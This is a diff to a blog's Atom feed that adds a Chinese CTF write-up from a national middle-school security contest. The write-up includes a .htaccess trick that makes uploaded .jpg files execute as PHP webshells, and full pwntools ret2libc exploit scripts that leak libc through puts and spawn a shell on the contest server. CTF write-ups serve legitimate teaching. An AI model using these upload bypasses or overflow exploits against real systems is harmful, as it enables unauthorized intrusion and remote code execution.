@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://iosmosis.github.io/"/>
-  <updated>2018-06-10T13:49:34.484Z</updated>
+  <updated>2018-06-12T03:37:51.493Z</updated>
   <id>http://iosmosis.github.io/</id>
   
   <author>
@@ -14,6 +14,55 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>全国中学生网络安全技术大赛-Writeup</title>
+    <link href="http://iosmosis.github.io/2018/06/12/%E5%85%A8%E5%9B%BD%E4%B8%AD%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-Writeup/"/>
+    <id>http://iosmosis.github.io/2018/06/12/全国中学生网络安全技术大赛-Writeup/</id>
+    <published>2018-06-12T03:10:55.000Z</published>
+    <updated>2018-06-12T03:37:51.493Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>打开题目得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Welcome</div><div class="line">121</div><div class="line">Welcome to msscstc!</div><div class="line"></div><div class="line">This is your flag: flag&#123;4f403810354870e07cb00b549cf577c9&#125;</div><div class="line"></div><div class="line">good luck &amp;&amp; have fun!</div></pre></td></tr></table></figure></p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="baby-upload"><a href="#baby-upload" class="headerlink" title="baby upload"></a>baby upload</h2><p><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/1.jpg" alt="ida1"><br>测试了没被禁用的上传点 发现上传没有任何反应 发现第三个禁用了 所以通过审查元素更改<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/2.jpg" alt="ida1"><br>根据hint提示 了解到 .htaccesss</p>
+<p>上传当前目录的.htaccess 文件</p>
+<p>例如内容为： AddType application/x-http-php .jpg   (上传的jpg 均以php执行)</p>
+<p>把.htaccess 上传后，且上传成功后，再上传内容为一句话的jpg文件</p>
+<p>所以构造上传<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/3.jpg" alt="ida1"></p>
+<p><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/4.jpg" alt="ida1"><br>这里修改为.htaccess 放行<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/5.jpg" alt="ida1"></p>
+<p>成功覆盖<br>接着上传jpg的小马 或者一句话<br>尝试传小马貌似有问题 这里改用post<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/6.jpg" alt="ida1"></p>
+<p><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/7.jpg" alt="ida1"><br>尝试一句话<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/8.jpg" alt="ida1"><br>尝试上传<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/9.jpg" alt="ida1"><br>成功解析<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/10.jpg" alt="ida1"></p>
+<p>执行find 找到flag目录<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/11.jpg" alt="ida1"><br>cat 得到flag<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/12.jpg" alt="ida1"></p>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="ez-pwn"><a href="#ez-pwn" class="headerlink" title="ez_pwn"></a>ez_pwn</h2><p>这里感谢一波出题人 放出了libc<br>载入ida分析<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">char</span> *<span class="title">sub_804857B</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></div><div class="line"></div><div class="line">  fflush(<span class="built_in">stdin</span>);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"How many?"</span>);</div><div class="line">  <span class="keyword">return</span> gets(&amp;s); <span class="comment">//存在漏洞</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>之前利用思路 a*buffer+jmp esp+shellcode</p>
+<p>But..</p>
+<p><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/13.jpg" alt="ida1"><br>NX开启 RELRO开启<br>所以 直接写shellcode就没办法了 </p>
+<p>通过leak puts_addr 找到 system binsh 的真实地址</p>
+<p>Leak通过 sub_804857B() 构造循环<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/14.jpg" alt="ida1"></p>
+<p>本地EXP<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level=<span class="string">'debug'</span></div><div class="line"></div><div class="line">p=process(<span class="string">'./pwn1'</span>)</div><div class="line"><span class="comment">#p = remote('45.40.195.20',23333)</span></div><div class="line">libc=ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>) //本地libc</div><div class="line">elf=ELF(<span class="string">'./pwn1'</span>)</div><div class="line">p.recv()</div><div class="line">p.sendline(<span class="string">'1'</span>)</div><div class="line">p.recv()</div><div class="line">//leak puts_addr</div><div class="line">puts_plt=elf.symbols[<span class="string">'puts'</span>]</div><div class="line">puts_got=elf.got[<span class="string">'puts'</span>]</div><div class="line">payload=<span class="string">'a'</span>*<span class="number">44</span>+p32(puts_plt)+p32(<span class="number">0x0804857b</span>)+p32(puts_got)</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line">puts=u32(p.recv(<span class="number">4</span>))</div><div class="line">log.info(<span class="string">'puts addr = '</span>+hex(puts)) </div><div class="line">puts_libc=libc.symbols[<span class="string">'puts'</span>]</div><div class="line">system=libc.symbols[<span class="string">'system'</span>]</div><div class="line">binsh=next(libc.search(<span class="string">'/bin/sh'</span>))</div><div class="line">system=system-puts_libc+puts</div><div class="line">binsh=binsh-puts_libc+puts</div><div class="line">payload2=<span class="string">'a'</span>*<span class="number">44</span>+p32(system)+p32(<span class="number">1</span>)+p32(binsh)</div><div class="line">p.sendline(payload2)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<p>由于之前提供错了libc 自己远程recv也写错了2333<br>北邮面试完回来修改得到<br>远程EXP<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level=<span class="string">'debug'</span></div><div class="line"></div><div class="line"><span class="comment">#p=process('./pwn1')</span></div><div class="line">p = remote(<span class="string">'45.40.195.20'</span>,<span class="number">23333</span>)</div><div class="line">libc=ELF(<span class="string">'libc6-i386_2.23-0ubuntu10_amd64.so'</span>)</div><div class="line">elf=ELF(<span class="string">'./pwn1'</span>)</div><div class="line">p.recv()</div><div class="line">p.sendline(<span class="string">'1'</span>)</div><div class="line">p.recv()</div><div class="line">puts_plt=elf.symbols[<span class="string">'puts'</span>]</div><div class="line">puts_got=elf.got[<span class="string">'puts'</span>]</div><div class="line">payload=<span class="string">'a'</span>*<span class="number">44</span>+p32(puts_plt)+p32(<span class="number">0x0804857b</span>)+p32(puts_got)</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line">p.recvuntil(<span class="string">'\n'</span>)  //多加了这里</div><div class="line">puts=u32(p.recv(<span class="number">4</span>))</div><div class="line">log.info(<span class="string">'puts addr = '</span>+hex(puts))</div><div class="line">puts_libc=libc.symbols[<span class="string">'puts'</span>]</div><div class="line">system=libc.symbols[<span class="string">'system'</span>]</div><div class="line">binsh=next(libc.search(<span class="string">'/bin/sh'</span>))</div><div class="line">system=system-puts_libc+puts</div><div class="line">binsh=binsh-puts_libc+puts</div><div class="line">payload2=<span class="string">'a'</span>*<span class="number">44</span>+p32(system)+p32(<span class="number">1</span>)+p32(binsh)</div><div class="line">p.sendline(payload2)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<p>得到flag<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/15.jpg" alt="ida1"></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h1&gt;&lt;h2 id=&quot;签到题&quot;&gt;&lt;a href=&quot;#签到题&quot; class=&quot;headerlink&quot; title=&quot;签到题&quot;&gt;&lt;/a&gt;签到
+    
+    </summary>
+    
+    
+      <category term="writeup" scheme="http://iosmosis.github.io/tags/writeup/"/>
+    
+      <category term="WEB" scheme="http://iosmosis.github.io/tags/WEB/"/>
+    
+      <category term="msscstc" scheme="http://iosmosis.github.io/tags/msscstc/"/>
+    
+      <category term="PWN" scheme="http://iosmosis.github.io/tags/PWN/"/>
+    
+      <category term="MISC" scheme="http://iosmosis.github.io/tags/MISC/"/>
+    
+      <category term="西电网安杯" scheme="http://iosmosis.github.io/tags/%E8%A5%BF%E7%94%B5%E7%BD%91%E5%AE%89%E6%9D%AF/"/>
+    
+  </entry>
   
   <entry>
     <title>2018北邮自招复试-CTF-Writeup</title>
